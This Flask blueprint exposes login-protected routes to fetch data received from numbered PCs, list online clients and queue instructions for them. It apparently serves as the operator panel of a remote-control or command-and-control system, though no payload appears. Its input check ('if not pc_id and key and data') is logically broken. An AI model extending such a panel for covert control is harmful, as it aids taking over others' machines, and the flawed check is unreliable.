from flask import Blueprint, request, jsonify, session, redirect, url_for
from utils.server_manager import server_manager
from utils.clients_manager import clients_manager


receive_bp = Blueprint('receive', __name__)

@receive_bp.route('/receive')
def receive_index():
    if 'logged_in' not in session:
        return redirect(url_for('home.login'))

    pc_id = request.args.get("pc_id")
    key = request.args.get("key")

    response_data = server_manager.get_receive_data(f"{pc_id}_{key}")
    if not response_data:
        return jsonify({'status': 'false'}), 200

    data = response_data.get("data")
    pc_id = response_data.get("pc_id")
        
    return jsonify({'status': 'success', 'data': data, 'pc_id': pc_id})

@receive_bp.route('/online_clients')
def online_clients():
    if 'logged_in' not in session:
        return redirect(url_for('home.login'))

    response_data = clients_manager.get_active_clients()
        
    return jsonify({'status': 'success', 'data': response_data})

@receive_bp.route('/add', methods=['POST'])
def add_instruction_route():
    if 'logged_in' not in session:
        return redirect(url_for('home.login'))

    data = request.get_json()
    instruct_data = data.get('data')

    pc_id = request.args.get("pc_id")
    key = request.args.get("key")

    if not pc_id and key and data:
        return jsonify({'status': 'false'}), 200

    clients_manager.add_instruction(pc_id, instruct_data)
        
    return jsonify({'status': 'success'})